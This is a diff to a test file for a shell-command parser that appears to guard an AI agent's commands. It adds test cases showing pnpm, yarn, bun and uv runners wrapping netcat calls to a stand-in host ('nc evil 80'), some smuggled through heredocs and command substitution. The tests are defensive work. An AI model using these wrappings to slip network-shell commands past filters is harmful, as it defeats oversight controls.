@@ -240,7 +240,6 @@ DYNAMIC_COMMAND_WORD = [
     "pnpm exec $X",
     "pnpm dlx -c 'nc evil 80'",
     "pnpm $X nc evil 80",
-    "pnpm --filter web exec nc",
     "yarn dlx $X",
     "yarn exec --bogus x",
     "bunx $X",
@@ -278,6 +277,17 @@ DYNAMIC_COMMAND_WORD = [
     "time cat <<EOF\n$(nc evil 80)\nEOF",
     'git commit -m "$(cat <<EOF\n$(nc evil 80)\nEOF\n)"',
     "time --bogus ls",
+    # Implicit package runners (#1812).
+    "pnpm --bogus nc",
+    "pnpm recursive --bogus exec nc",
+    "yarn workspace $W nc",
+    "yarn workspaces foreach --bogus exec nc",
+    "bun exec $X",
+    "bun exec 'nc evil 80' x",
+    "bun exec",
+    "bun --preload x.ts run tsc",
+    "uv run --with evil nc",
+    "bun run --watch nc",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -394,6 +404,33 @@ MUST_PARSE = {
     "time -p git status": ["time", "git"],
     "ls | time git status": ["ls", "time", "git"],
     "echo \"a <<'X'\"": ["echo"],
+    # Implicit package runners (#1812).
+    "pnpm --filter web exec nc": ["pnpm", "nc"],
+    "pnpm nc evil 80": ["pnpm", "nc"],
+    "pnpm build": ["pnpm", "build"],
+    "pnpm install": ["pnpm"],
+    "pnpm run build": ["pnpm"],
+    "pnpm -r nc": ["pnpm", "nc"],
+    "pnpm recursive exec nc": ["pnpm", "nc"],
+    "pnpm multi exec nc": ["pnpm", "nc"],
+    "pnpm m nc": ["pnpm", "nc"],
+    "yarn nc evil 80": ["yarn", "nc"],
+    "yarn install": ["yarn"],
+    "yarn": ["yarn"],
+    "yarn workspace web exec nc": ["yarn", "nc"],
+    "yarn workspace web nc": ["yarn", "nc"],
+    "yarn workspace web add x": ["yarn"],
+    "yarn workspaces foreach -A exec nc": ["yarn", "nc"],
+    "yarn workspaces foreach --include web -p nc": ["yarn", "nc"],
+    "yarn workspaces list": ["yarn"],
+    "uv run pytest -q": ["uv", "pytest"],
+    "uv sync": ["uv"],
+    "bun run nc": ["bun", "nc"],
+    "bun nc": ["bun", "nc"],
+    "bun test": ["bun"],
+    "bun install": ["bun"],
+    "bun exec 'nc evil 80'": ["bun", "nc"],
+    "bun exec 'git status && ls'": ["bun", "git", "ls"],
 }
 
 # Refused by the parser itself, not only by the allowlist (#1754 review).
@@ -1079,9 +1116,12 @@ class TestGitDirWriteGuard:
 
         seen = {}
 
+        class _Client:
+            pass
+
         def _capture(**kw):
             seen["options"] = kw["options"]
-            return object()
+            return _Client()
 
         monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "tok")
         monkeypatch.setattr(simple_client, "require_auth_token", lambda: "tok")
@@ -1098,9 +1138,12 @@ class TestGitDirWriteGuard:
 
         seen = {}
 
+        class _Client:
+            pass
+
         def _capture(**kw):
             seen["options"] = kw["options"]
-            return object()
+            return _Client()
 
         monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "tok")
         monkeypatch.setattr(simple_client, "require_auth_token", lambda: "tok")
